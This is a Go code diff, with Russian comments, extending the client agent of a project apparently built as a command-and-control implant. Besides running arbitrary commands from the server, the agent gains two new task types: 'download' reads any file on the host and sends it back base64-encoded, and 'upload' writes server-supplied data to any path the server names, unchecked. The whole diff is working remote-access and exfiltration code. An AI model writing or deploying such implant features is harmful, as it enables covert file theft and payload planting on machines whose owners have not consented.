@@ -8,12 +8,14 @@ import (
 	"c2-project/internal/compress"
 	"c2-project/internal/crypto"
 	"c2-project/internal/executor"
+	"c2-project/internal/filetransfer"
 	"c2-project/internal/jwt"
 	"c2-project/internal/logger"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
 	"context"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net/http"
@@ -104,7 +106,7 @@ func (s *Service) Run() error {
 		}
 
 		// Выполняем задачу
-		output, err := s.executor.Execute(task.Command)
+		output, err := s.executeTask(task)
 		status := "completed"
 		if err != nil {
 			status = "failed"
@@ -210,7 +212,10 @@ func (s *Service) poll() (models.Task, error) {
 		}
 	}
 
-	logger.Info("Task decrypted", logger.String("command", task.Command))
+	logger.Info("Task decrypted",
+		logger.String("command", task.Command),
+		logger.Int("file_data_len", len(task.FileData)),
+		logger.String("file_name", task.FileName))
 	return task, nil
 }
 
@@ -323,4 +328,63 @@ func getTokenFromBearer(authHeader string) string {
 		return ""
 	}
 	return parts[1]
+}
+
+// executeTask — выполняет задачу: файловую или обычную команду.
+func (s *Service) executeTask(task models.Task) (string, error) {
+	switch {
+	case task.Command == "upload" && task.FileData != "":
+		// Сервер шлёт файл клиенту → сохраняем.
+		return s.handleFileUpload(task)
+	case task.Command == "download" && task.FileName != "":
+		// Сервер просит файл у клиента → читаем.
+		return s.handleFileDownload(task)
+	default:
+		// Обычная команда → executor.
+		return s.executor.Execute(task.Command)
+	}
+}
+
+// handleFileUpload — сохраняет файл, переданный сервером.
+// Команда формата: "upload" + Task.FileName + Task.FileData + Task.FileChecksum.
+func (s *Service) handleFileUpload(task models.Task) (string, error) {
+	if task.FileData == "" {
+		return "", fmt.Errorf("empty file data")
+	}
+
+	data, err := filetransfer.DecodeBase64(task.FileData, task.FileChecksum)
+	if err != nil {
+		return "", fmt.Errorf("decode file: %w", err)
+	}
+
+	// task.FileName содержит путь, куда сохранять (например, "uploads/hello.txt").
+	// Используем как есть — не добавляем дополнительную директорию.
+	path := task.FileName
+	if path == "" {
+		path = "unnamed"
+	}
+
+	if err := filetransfer.SaveFile(path, data); err != nil {
+		return "", fmt.Errorf("save file: %w", err)
+	}
+
+	return fmt.Sprintf("File saved: %s (%d bytes, checksum verified)", path, len(data)), nil
+}
+
+// handleFileDownload — читает файл с клиента и готовит к отправке.
+// Возвращает base64(данные)|sha256-hex, чтобы терминал мог проверить целостность.
+func (s *Service) handleFileDownload(task models.Task) (string, error) {
+	if task.FileName == "" {
+		return "", fmt.Errorf("empty file path")
+	}
+
+	data, err := os.ReadFile(task.FileName)
+	if err != nil {
+		return "", fmt.Errorf("read file: %w", err)
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(data)
+	checksum := filetransfer.ComputeChecksum(data)
+
+	return encoded + "|" + checksum, nil
 }
